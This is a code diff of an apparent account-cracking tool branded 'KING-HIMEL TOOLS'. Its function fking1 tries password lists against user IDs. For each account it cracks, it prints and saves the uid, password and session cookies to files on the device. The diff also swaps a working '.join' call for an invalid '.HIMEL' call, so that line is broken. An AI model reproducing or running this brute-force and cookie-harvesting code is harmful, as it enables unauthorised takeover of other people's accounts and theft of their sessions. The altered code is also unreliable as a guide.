@@ -175,7 +175,7 @@ logo=("""\033[1;94m
   [∆]\033[1;94;1m Whatsapp : 01601161609
   [∆]\033[1;91;1m GitHub   : KINGHIMEK32
   [∆]\033[1;92;1m Virson   : KH32.0.22                
-\033[1;31m====================================================
+\033[1;31m  ==================================================
 \33[37;41m\t WELLCOME TO KING-HIMEL TOOLS\33[0;m""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -390,7 +390,7 @@ def fking1(ids,passlist):
                                 else:
                                         print('\r\r\033[31;47m [HIMEL==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                         print("")
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        coki = ";".HIMEL(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                         open('/sdcard/HIMEL-COOKIE.txt','a').write(coki+'\n')
                                         open('/sdcard/HIMEL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
